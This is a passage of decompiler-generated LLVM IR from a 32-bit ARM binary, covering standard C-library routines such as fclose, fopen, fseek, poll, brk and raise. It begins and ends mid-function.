  %v7_19b3c = inttoptr i32 %v6_19b3c to i32*
  store i32 0, i32* %v7_19b3c, align 4
  store i32 ptrtoint (i32* @global_var_2ef84.1136 to i32), i32* @r4, align 4
  %v2_19b44 = load i32, i32* @global_var_2ef84.1136, align 4
  store i32 ptrtoint (i32* @global_var_2ef64.1140 to i32), i32* @r5, align 4
  %v1_19b50 = add i32 %v2_19b44, -1
  store i32 %v1_19b50, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_19b44, 1
  br i1 %tmp59, label %dec_label_pc_19b58, label %dec_label_pc_19b28

dec_label_pc_19b58:                               ; preds = %dec_label_pc_19b28, %dec_label_pc_19b40.preheader
  br label %dec_label_pc_19b78

dec_label_pc_19b60:                               ; preds = %dec_label_pc_19b90
  %v1_19b60 = add i32 %v5_19b80, -36
  %v2_19b60 = inttoptr i32 %v1_19b60 to i32*
  %v3_19b60 = load i32, i32* %v2_19b60, align 4
  store i32 %v3_19b60, i32* %r0.global-to-local, align 4
  %v1_19b64 = inttoptr i32 %v3_19b60 to i8*
  %v2_19b64 = call i32 @__GI_strdup(i8* %v1_19b64)
  store i32 %v2_19b64, i32* %r0.global-to-local, align 4
  %v0_19b6c = load i32, i32* @r4, align 4
  %v1_19b6c = add i32 %v0_19b6c, 1
  store i32 %v1_19b6c, i32* %r2.global-to-local, align 4
  %v5_19b70 = mul i32 %v0_19b6c, 4
  %v6_19b70 = add i32 %v5_19b70, ptrtoint (i32* @global_var_2ef64.1140 to i32)
  %v7_19b70 = inttoptr i32 %v6_19b70 to i32*
  store i32 %v2_19b64, i32* %v7_19b70, align 4
  %v0_19b74 = load i32, i32* %r2.global-to-local, align 4
  %v1_19b74 = load i32, i32* @r6, align 4
  %v2_19b74 = inttoptr i32 %v1_19b74 to i32*
  store i32 %v0_19b74, i32* %v2_19b74, align 4
  %v0_19b7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19b78

dec_label_pc_19b78:                               ; preds = %dec_label_pc_19b58, %dec_label_pc_19b60
  %v0_19b88 = phi i32 [ 1, %dec_label_pc_19b58 ], [ %v0_19b7c.pre, %dec_label_pc_19b60 ]
  store i32 %v2_19a10, i32* %r2.global-to-local, align 4
  %v1_19b7c = load i32, i32* @r8, align 4
  %v2_19b7c = sub i32 %v0_19b88, %v1_19b7c
  %v4_19b7c = xor i32 %v1_19b7c, %v0_19b88
  %v5_19b7c = xor i32 %v2_19b7c, %v0_19b88
  %v6_19b7c = and i32 %v5_19b7c, %v4_19b7c
  %v7_19b7c = icmp slt i32 %v6_19b7c, 0
  %v8_19b7c = icmp slt i32 %v2_19b7c, 0
  %v4_19b80 = mul i32 %v0_19b88, 4
  %v5_19b80 = add i32 %v4_19b80, %v2_19a10
  store i32 ptrtoint (i32* @global_var_2ef84.1136 to i32), i32* @r6, align 4
  %v1_19b88 = add i32 %v0_19b88, 1
  store i32 %v1_19b88, i32* @r5, align 4
  %v2_19b8c = xor i1 %v8_19b7c, %v7_19b7c
  br i1 %v2_19b8c, label %dec_label_pc_19b90, label %dec_label_pc_19b9c.backedge

dec_label_pc_19b90:                               ; preds = %dec_label_pc_19b78
  %v2_19b90 = load i32, i32* @global_var_2ef84.1136, align 4
  store i32 %v2_19b90, i32* @r4, align 4
  %v7_19b98 = icmp slt i32 %v2_19b90, 4
  br i1 %v7_19b98, label %dec_label_pc_19b60, label %dec_label_pc_19b9c.backedge

dec_label_pc_199cc.preheader:                     ; preds = %dec_label_pc_199cc.preheader.lr.ph, %dec_label_pc_19b9c.backedge
  store i32 %v2_19960, i32* %r0.global-to-local, align 4
  %v2_199cc12 = load i8, i8* %v1_199cc11, align 4
  %v3_199cc13 = zext i8 %v2_199cc12 to i32
  store i32 %v3_199cc13, i32* %r2.global-to-local, align 4
  %v2_199d014 = icmp eq i8 %v2_199cc12, 0
  br i1 %v2_199d014, label %dec_label_pc_199ec, label %dec_label_pc_199d8.lr.ph

dec_label_pc_199d8.lr.ph:                         ; preds = %dec_label_pc_199cc.preheader
  %v2_199dc.pre = load i32, i32* @global_var_288c8, align 4
  br label %dec_label_pc_199d8

dec_label_pc_19bbc:                               ; preds = %dec_label_pc_19b9c.backedge, %dec_label_pc_19b9c.preheader
  %v0_19bbc = load i32, i32* @sl, align 4
  store i32 %v0_19bbc, i32* %r0.global-to-local, align 4
  %v1_19bc0 = inttoptr i32 %v0_19bbc to i8*
  %v2_19bc0 = call i32 @__GI_fclose(i8* %v1_19bc0)
  store i32 %v2_19bc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bd4

dec_label_pc_19bc8:                               ; preds = %dec_label_pc_199b0
  %v0_19bc8 = call i32 @__GI___h_errno_location()
  store i32 %v0_19bc8, i32* %r0.global-to-local, align 4
  %v2_19bd0 = inttoptr i32 %v0_19bc8 to i32*
  store i32 3, i32* %v2_19bd0, align 4
  br label %dec_label_pc_19bd4

dec_label_pc_19bd4:                               ; preds = %entry, %dec_label_pc_19bbc, %dec_label_pc_19bc8
  store i32 %v2_19964, i32* @r0, align 4
  %v1_19be4 = call i32 @__pthread_return_void()
  store i32 %v1_19be4, i32* %r0.global-to-local, align 4
  store i32 %v6_1995c, i32* @r5, align 4
  store i32 %v9_1995c, i32* @r6, align 4
  store i32 %v12_1995c, i32* @r7, align 4
  store i32 %v15_1995c, i32* @r8, align 4
  store i32 %v18_1995c, i32* @sl, align 4
  ret i32 %v1_19be4

; uselistorder directives
  uselistorder i32 %v3_199cc13, { 2, 1, 0 }
  uselistorder i32 %v2_19b7c, { 1, 0 }
  uselistorder i32 %v0_19b88, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_19b50, { 1, 0 }
  uselistorder i32 %v1_19b5065, { 1, 0 }
  uselistorder i32 %v2_19adc, { 1, 0 }
  uselistorder i32 %v0_19ae8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_19a18, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_19a5820, { 1, 0, 2 }
  uselistorder i32 %v2_19a10, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_19960, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 6, 7, 9, 0, 12, 10, 11, 13, 4, 14, 3, 15, 17, 16, 1, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 6, 5, 23, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 24, 17, 18, 22, 19, 21, 26, 25, 20, 3, 2, 27, 29, 1, 28 }
  uselistorder i32 ()* @__GI___h_errno_location, { 0, 5, 2, 1, 6, 4, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_2ef64.1140 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_2ef84.1136, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_2ef84.1136 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2ef74.981 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_2ef80.978, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_19bd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_199cc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19b78, { 1, 0 }
  uselistorder label %dec_label_pc_19b28, { 1, 0 }
  uselistorder label %dec_label_pc_19b40.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19afc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19ad8, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_19a84, { 1, 0 }
  uselistorder label %dec_label_pc_19a80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19a64, { 1, 0 }
  uselistorder label %dec_label_pc_19a50, { 1, 0 }
  uselistorder label %dec_label_pc_19a30, { 1, 0 }
  uselistorder label %dec_label_pc_19b9c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_199ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19b9c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_19c6c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_19c6c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_19c78 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_19c80 = call i32 @__libc_getpid()
  store i32 %v3_19c78, i32* @r4, align 4
  %v0_19c8c = call i32 @kill()
  ret i32 %v0_19c8c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19c90 = add i32 %arg1, 28
  %v2_19c90 = inttoptr i32 %v1_19c90 to i32*
  %v3_19c90 = load i32, i32* %v2_19c90, align 4
  %v1_19c98 = add i32 %arg1, 44
  %v2_19c98 = inttoptr i32 %v1_19c98 to i32*
  %v3_19c98 = load i32, i32* %v2_19c98, align 4
  store i32 %v3_19c90, i32* @global_var_2ef88.1167, align 4
  store i32 %v3_19c98, i32* @global_var_2ef8c.1169, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_19cbc = call i32 @brk(i32* %arg1)
  %v3_19cc0 = icmp ult i32 %v2_19cbc, %tmp
  store i32 %v2_19cbc, i32* @global_var_2eeb8.1105, align 4
  br i1 %v3_19cc0, label %dec_label_pc_19cd4, label %dec_label_pc_19ce4

dec_label_pc_19cd4:                               ; preds = %entry
  %v0_19cd4 = call i32 @__errno_location()
  %v2_19cdc = inttoptr i32 %v0_19cd4 to i32*
  store i32 12, i32* %v2_19cdc, align 4
  br label %dec_label_pc_19ce4

dec_label_pc_19ce4:                               ; preds = %entry, %dec_label_pc_19cd4
  %v0_19ce4 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_19cd4 ]
  ret i32 %v0_19ce4

; uselistorder directives
  uselistorder i32* @global_var_2eeb8.1105, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19ce4, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19cf0 = load i32, i32* @r4, align 4
  store i32 %v3_19cf0, i32* %stack_var_-8, align 4
  %v5_19cf4 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_19cf4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_19cf4, -4095
  br i1 %tmp, label %dec_label_pc_19d14, label %dec_label_pc_19d04

dec_label_pc_19d04:                               ; preds = %entry
  %v0_19d04 = call i32 @__errno_location()
  %v0_19d08 = load i32, i32* %r4.global-to-local, align 4
  %v1_19d08 = sub i32 0, %v0_19d08
  %v2_19d0c = inttoptr i32 %v0_19d04 to i32*
  store i32 %v1_19d08, i32* %v2_19d0c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19d14

dec_label_pc_19d14:                               ; preds = %entry, %dec_label_pc_19d04
  %v0_19d14 = phi i32 [ %v5_19cf4, %entry ], [ -1, %dec_label_pc_19d04 ]
  %v2_19d18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19d18, i32* @r4, align 4
  ret i32 %v0_19d14

; uselistorder directives
  uselistorder i32 %v5_19cf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19d14, { 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_19d20 = add i32 %tmp, 52
  %v3_19d20 = inttoptr i32 %v2_19d20 to i32*
  %v4_19d20 = load i32, i32* %v3_19d20, align 4
  store i32 %v4_19d20, i32* @r8, align 4
  %v2_19d24 = add i32 %tmp, 56
  store i32 %v2_19d24, i32* @r5, align 4
  %v2_19d28 = ptrtoint i32* %stack_var_-64 to i32
  %v2_19d2c = icmp eq i32 %v4_19d20, 0
  store i1 %v2_19d2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_19d3c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19d3c, i32* @r0, align 4
  br i1 %v2_19d2c, label %dec_label_pc_19d44, label %dec_label_pc_19d60

dec_label_pc_19d44:                               ; preds = %entry
  store i32 95952, i32* %r3.global-to-local, align 4
  %v1_19d4c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r3.global-to-local, align 4
  %v1_19d5c = call i32 @__pthread_return_0()
  %v0_19d60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d60

dec_label_pc_19d60:                               ; preds = %entry, %dec_label_pc_19d44
  %v0_19d68 = phi i32 [ %tmp, %entry ], [ %v0_19d60.pre, %dec_label_pc_19d44 ]
  %v1_19d60 = inttoptr i32 %v0_19d68 to i8*
  %v2_19d60 = load i8, i8* %v1_19d60, align 1
  %v3_19d60 = zext i8 %v2_19d60 to i32
  %v1_19d64 = and i32 %v3_19d60, 64
  store i32 %v1_19d64, i32* %r3.global-to-local, align 4
  %v2_19d64 = icmp eq i32 %v1_19d64, 0
  store i1 %v2_19d64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_19d64, i32* @r7, align 4
  br i1 %v2_19d64, label %dec_label_pc_19d7c, label %dec_label_pc_19d74

dec_label_pc_19d74:                               ; preds = %dec_label_pc_19d60
  %v3_19d74 = call i32 @fflush_unlocked(i8* %v1_19d60)
  store i32 %v3_19d74, i32* @r7, align 4
  %v0_19d7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d7c

dec_label_pc_19d7c:                               ; preds = %dec_label_pc_19d60, %dec_label_pc_19d74
  %v0_19d7c = phi i32 [ %v0_19d68, %dec_label_pc_19d60 ], [ %v0_19d7c.pre, %dec_label_pc_19d74 ]
  %v1_19d7c = add i32 %v0_19d7c, 4
  %v2_19d7c = inttoptr i32 %v1_19d7c to i32*
  %v3_19d7c = load i32, i32* %v2_19d7c, align 4
  %v1_19d80 = call i32 @__libc_close(i32 %v3_19d7c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_19d88 = icmp slt i32 %v1_19d80, 0
  %v2_19d88 = icmp eq i32 %v1_19d80, 0
  store i1 %v2_19d88, i1* %cpsr_z.global-to-local, align 1
  %v1_19d8c = load i32, i32* @r4, align 4
  %v2_19d8c = add i32 %v1_19d8c, 4
  %v3_19d8c = inttoptr i32 %v2_19d8c to i32*
  store i32 -1, i32* %v3_19d8c, align 4
  store i32 %v2_19d28, i32* @r0, align 4
  br i1 %v1_19d88, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_19d7c
  %v3_19da0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_19da0, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_19d7c, %bb
  %v1_19dac = call i32 @__pthread_return_void()
  %v1_19db8 = call i32 @__pthread_return_0()
  %v2_19dc0 = load i32, i32* @global_var_2cc60.1176, align 4
  %v1_19dc4 = add i32 %v2_19dc0, 1
  store i32 %v1_19dc4, i32* %r3.global-to-local, align 4
  store i32 %v1_19dc4, i32* @global_var_2cc60.1176, align 4
  store i32 %v2_19d28, i32* @r0, align 4
  %v1_19ddc = call i32 @__pthread_return_void()
  %v0_19de0 = load i32, i32* @r4, align 4
  %v1_19de0 = inttoptr i32 %v0_19de0 to i32*
  %v2_19de0 = load i32, i32* %v1_19de0, align 4
  %v1_19de4 = and i32 %v2_19de0, 24576
  store i32 %v1_19de4, i32* %r3.global-to-local, align 4
  %v3_19de81 = udiv i32 %v1_19de4, 256
  %v1_19dec = trunc i32 %v3_19de81 to i8
  %v3_19dec = add i32 %v0_19de0, 1
  %v4_19dec = inttoptr i32 %v3_19dec to i8*
  store i8 %v1_19dec, i8* %v4_19dec, align 1
  %v0_19df0 = load i32, i32* %r3.global-to-local, align 4
  %v1_19df0 = trunc i32 %v0_19df0 to i8
  %v2_19df0 = load i32, i32* @r4, align 4
  %v3_19df0 = inttoptr i32 %v2_19df0 to i8*
  store i8 %v1_19df0, i8* %v3_19df0, align 1
  %v0_19df4 = load i32, i32* @r4, align 4
  %v1_19df4 = inttoptr i32 %v0_19df4 to i32*
  %v2_19df4 = load i32, i32* %v1_19df4, align 4
  %v1_19df8 = or i32 %v2_19df4, 48
  store i32 %v1_19df8, i32* %r3.global-to-local, align 4
  %v3_19dfc = sdiv i32 %v2_19df4, 256
  %v0_19e00 = load i32, i32* @r8, align 4
  %v2_19e00 = icmp eq i32 %v0_19e00, 0
  store i1 %v2_19e00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_19d3c, i32* @r0, align 4
  %v1_19e10 = trunc i32 %v3_19dfc to i8
  %v3_19e10 = add i32 %v0_19df4, 1
  %v4_19e10 = inttoptr i32 %v3_19e10 to i8*
  store i8 %v1_19e10, i8* %v4_19e10, align 1
  %v0_19e14 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e14 = trunc i32 %v0_19e14 to i8
  %v2_19e14 = load i32, i32* @r4, align 4
  %v3_19e14 = inttoptr i32 %v2_19e14 to i8*
  store i8 %v1_19e14, i8* %v3_19e14, align 1
  %v0_19e18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19e18, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_19e1c = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_19e20 = load i32, i32* @r4, align 4
  %v1_19e20 = add i32 %v0_19e20, 1
  %v2_19e20 = inttoptr i32 %v1_19e20 to i8*
  %v3_19e20 = load i8, i8* %v2_19e20, align 1
  %v4_19e20 = zext i8 %v3_19e20 to i32
  store i32 %v4_19e20, i32* %r3.global-to-local, align 4
  %v1_19e24 = and i32 %v4_19e20, 64
  %v2_19e24 = icmp eq i32 %v1_19e24, 0
  store i1 %v2_19e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19e24, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_19e2c = xor i1 %v2_19e24, true
  call void @__pseudo_cond_branch(i1 %v1_19e2c, i32 ptrtoint (i32* @global_var_167b4.1142 to i32))
  store i32 %v2_19d28, i32* @r0, align 4
  %v1_19e40 = call i32 @__pthread_return_void()
  %v1_19e4c = call i32 @__pthread_return_0()
  %v2_19e54 = load i32, i32* @global_var_2cc64.1180, align 4
  %v1_19e58 = add i32 %v2_19e54, 1
  store i32 %v1_19e58, i32* %r3.global-to-local, align 4
  store i32 %v2_19d28, i32* @r0, align 4
  store i32 %v1_19e58, i32* @global_var_2cc64.1180, align 4
  %v1_19e6c = call i32 @__pthread_return_void()
  %v1_19e70 = call i32 @_stdio_openlist_dec_use(i32 %v1_19e6c)
  %v0_19e74 = load i32, i32* @r7, align 4
  ret i32 %v0_19e74

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__libc_close, { 0, 14, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 13, 12, 2, 1, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_19d7c, { 1, 0 }
  uselistorder label %dec_label_pc_19d60, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_19ea4 = call i32 @_stdio_fopen()
  ret i32 %v0_19ea4
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_19ea8 = load i32, i32* @r2, align 4
  store i32 %v0_19ea8, i32* @r3, align 4
  %v0_19eb0 = call i32 @__GI_fseeko64()
  ret i32 %v0_19eb0
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_19eb4 = load i32, i32* @r4, align 4
  %v6_19eb4 = load i32, i32* @r5, align 4
  %v9_19eb4 = load i32, i32* @r6, align 4
  %v0_19eb8 = load i32, i32* @r3, align 4
  %v2_19ebc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_19eb8, i32* @r6, align 4
  %v0_19ec4 = load i32, i32* @r0, align 4
  store i32 %v0_19ec4, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_19eb8, 3
  br i1 %tmp, label %dec_label_pc_19ee0, label %dec_label_pc_19ecc

dec_label_pc_19ecc:                               ; preds = %entry
  %v0_19ecc = call i32 @__errno_location()
  store i32 %v0_19ecc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_19ed8 = inttoptr i32 %v0_19ecc to i32*
  store i32 22, i32* %v2_19ed8, align 4
  br label %.thread3

dec_label_pc_19ee0:                               ; preds = %entry
  %v1_19ee0 = add i32 %v0_19ec4, 52
  %v2_19ee0 = inttoptr i32 %v1_19ee0 to i32*
  %v3_19ee0 = load i32, i32* %v2_19ee0, align 4
  store i32 %v3_19ee0, i32* %r7.global-to-local, align 4
  %v2_19ee4 = icmp eq i32 %v3_19ee0, 0
  %v0_19ee8 = load i32, i32* @r1, align 4
  store i32 %v0_19ee8, i32* %stack_var_-28, align 4
  br i1 %v2_19ee4, label %dec_label_pc_19ef4, label %dec_label_pc_19f20

dec_label_pc_19ef4:                               ; preds = %dec_label_pc_19ee0
  %v1_19ef4 = add i32 %v0_19ec4, 56
  store i32 %v1_19ef4, i32* @r4, align 4
  store i32 95952, i32* %r3.global-to-local, align 4
  store i32 %v2_19ebc, i32* @r0, align 4
  store i32 %v1_19ef4, i32* %r2.global-to-local, align 4
  %v1_19f0c = call i32 @__pthread_return_void()
  %v0_19f10 = load i32, i32* @r4, align 4
  store i32 %v0_19f10, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r3.global-to-local, align 4
  store i32 106272, i32* @lr, align 4
  %v1_19f1c = call i32 @__pthread_return_0()
  store i32 %v1_19f1c, i32* %r0.global-to-local, align 4
  %v0_19f20.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19f20

dec_label_pc_19f20:                               ; preds = %dec_label_pc_19ee0, %dec_label_pc_19ef4
  %v0_19f2c = phi i32 [ %v0_19ec4, %dec_label_pc_19ee0 ], [ %v0_19f20.pre, %dec_label_pc_19ef4 ]
  %v1_19f20 = inttoptr i32 %v0_19f2c to i8*
  %v2_19f20 = load i8, i8* %v1_19f20, align 1
  %v3_19f20 = zext i8 %v2_19f20 to i32
  store i32 %v3_19f20, i32* %r3.global-to-local, align 4
  %v1_19f24 = and i32 %v3_19f20, 64
  %v2_19f24 = icmp eq i32 %v1_19f24, 0
  br i1 %v2_19f24, label %dec_label_pc_19f3c, label %dec_label_pc_19f2c

dec_label_pc_19f2c:                               ; preds = %dec_label_pc_19f20
  store i32 %v0_19f2c, i32* @r0, align 4
  %v0_19f30 = call i32 @__stdio_wcommit()
  store i32 %v0_19f30, i32* %r0.global-to-local, align 4
  %v2_19f34 = icmp eq i32 %v0_19f30, 0
  br i1 %v2_19f34, label %dec_label_pc_19f3c, label %dec_label_pc_19fac

dec_label_pc_19f3c:                               ; preds = %dec_label_pc_19f2c, %dec_label_pc_19f20
  %v0_19f3c = load i32, i32* @r6, align 4
  %v7_19f3c = icmp eq i32 %v0_19f3c, 1
  br i1 %v7_19f3c, label %dec_label_pc_19f44, label %dec_label_pc_19f3c.dec_label_pc_19f58_crit_edge

dec_label_pc_19f3c.dec_label_pc_19f58_crit_edge:  ; preds = %dec_label_pc_19f3c
  br label %dec_label_pc_19f58

dec_label_pc_19f44:                               ; preds = %dec_label_pc_19f3c
  %v0_19f44 = load i32, i32* @r5, align 4
  store i32 %v0_19f44, i32* %r0.global-to-local, align 4
  %v2_19f48 = ptrtoint i32* %stack_var_-28 to i32
  %v2_19f4c = inttoptr i32 %v0_19f44 to i8*
  %v3_19f4c = call i32 @__stdio_adjust_position(i8* %v2_19f4c, i32 %v2_19f48)
  store i32 %v3_19f4c, i32* %r0.global-to-local, align 4
  %v1_19f50 = icmp slt i32 %v3_19f4c, 0
  br i1 %v1_19f50, label %dec_label_pc_19fac, label %dec_label_pc_19f44.dec_label_pc_19f58_crit_edge

dec_label_pc_19f44.dec_label_pc_19f58_crit_edge:  ; preds = %dec_label_pc_19f44
  %v0_19f58.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19f58

dec_label_pc_19f58:                               ; preds = %dec_label_pc_19f3c.dec_label_pc_19f58_crit_edge, %dec_label_pc_19f44.dec_label_pc_19f58_crit_edge
  %v0_19f58 = phi i32 [ %v0_19f3c, %dec_label_pc_19f3c.dec_label_pc_19f58_crit_edge ], [ %v0_19f58.pre, %dec_label_pc_19f44.dec_label_pc_19f58_crit_edge ]
  store i32 %v0_19f58, i32* %r2.global-to-local, align 4
  %v0_19f5c = load i32, i32* @r5, align 4
  store i32 %v0_19f5c, i32* %r0.global-to-local, align 4
  %v4_19f64 = call i32 @__stdio_seek(i32 %v0_19f5c, i32* nonnull %stack_var_-28, i32 %v0_19f58)
  store i32 %v4_19f64, i32* %r0.global-to-local, align 4
  %v1_19f68 = icmp slt i32 %v4_19f64, 0
  br i1 %v1_19f68, label %dec_label_pc_19fac, label %dec_label_pc_19f70

dec_label_pc_19f70:                               ; preds = %dec_label_pc_19f58
  %v0_19f70 = load i32, i32* @r5, align 4
  %v1_19f70 = inttoptr i32 %v0_19f70 to i32*
  %v2_19f70 = load i32, i32* %v1_19f70, align 4
  store i32 %v2_19f70, i32* %r3.global-to-local, align 4
  %v1_19f74 = add i32 %v0_19f70, 8
  %v2_19f74 = inttoptr i32 %v1_19f74 to i32*
  %v3_19f74 = load i32, i32* %v2_19f74, align 4
  store i32 %v3_19f74, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_19f7c = and i32 %v2_19f70, -72
  store i32 %v1_19f7c, i32* %r3.global-to-local, align 4
  %v3_19f80 = sdiv i32 %v2_19f70, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_19f88 = trunc i32 %v3_19f80 to i8
  %v3_19f88 = add i32 %v0_19f70, 1
  %v4_19f88 = inttoptr i32 %v3_19f88 to i8*
  store i8 %v1_19f88, i8* %v4_19f88, align 1
  %v0_19f8c = load i32, i32* %r2.global-to-local, align 4
  %v1_19f8c = load i32, i32* @r5, align 4
  %v2_19f8c = add i32 %v1_19f8c, 28
  %v3_19f8c = inttoptr i32 %v2_19f8c to i32*
  store i32 %v0_19f8c, i32* %v3_19f8c, align 4
  %v0_19f90 = load i32, i32* %r0.global-to-local, align 4
  %v1_19f90 = trunc i32 %v0_19f90 to i8
  %v2_19f90 = load i32, i32* @r5, align 4
  %v3_19f90 = add i32 %v2_19f90, 2
  %v4_19f90 = inttoptr i32 %v3_19f90 to i8*
  store i8 %v1_19f90, i8* %v4_19f90, align 1
  %v0_19f94 = load i32, i32* %r3.global-to-local, align 4
  %v1_19f94 = trunc i32 %v0_19f94 to i8
  %v2_19f94 = load i32, i32* @r5, align 4
  %v3_19f94 = inttoptr i32 %v2_19f94 to i8*
  store i8 %v1_19f94, i8* %v3_19f94, align 1
  %v0_19f98 = load i32, i32* %r2.global-to-local, align 4
  %v1_19f98 = load i32, i32* @r5, align 4
  %v2_19f98 = add i32 %v1_19f98, 16
  %v3_19f98 = inttoptr i32 %v2_19f98 to i32*
  store i32 %v0_19f98, i32* %v3_19f98, align 4
  %v0_19f9c = load i32, i32* %r2.global-to-local, align 4
  %v1_19f9c = load i32, i32* @r5, align 4
  %v2_19f9c = add i32 %v1_19f9c, 20
  %v3_19f9c = inttoptr i32 %v2_19f9c to i32*
  store i32 %v0_19f9c, i32* %v3_19f9c, align 4
  %v0_19fa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_19fa0 = load i32, i32* @r5, align 4
  %v2_19fa0 = add i32 %v1_19fa0, 24
  %v3_19fa0 = inttoptr i32 %v2_19fa0 to i32*
  store i32 %v0_19fa0, i32* %v3_19fa0, align 4
  %v0_19fa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_19fa4 = load i32, i32* @r5, align 4
  %v2_19fa4 = add i32 %v1_19fa4, 44
